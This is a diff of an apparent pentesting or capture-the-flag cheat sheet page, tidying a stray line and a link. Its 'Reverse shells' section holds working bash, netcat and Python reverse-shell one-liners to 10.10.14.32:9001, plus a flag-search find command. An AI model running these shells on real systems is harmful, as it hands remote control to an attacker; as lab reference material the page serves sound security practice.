@@ -46,7 +46,7 @@ Search for flag
 find / -type f \( -name "root.txt" -o -name "user.txt" \) 2>/dev/nul
 {% endhighlight %}
 [Back to the top](#header)
-bash -i >& /dev/tcp/10.10.14.32/9001 0>&1
+
 Reverse shells
 ================
 {% highlight bash%}
@@ -55,7 +55,7 @@ bash -i >& /dev/tcp/10.10.14.32/9001 0>&1
 rm -f /tmp/p; mknod /tmp/p p && nc 10.10.14.32 9001 0/tmp/p
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.32",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 {% endhighlight %}
-
+[Back to the top](#header)
 Creating Custom Wordlists
 =========================
 This can be easily achieved using [exrex][link13]:
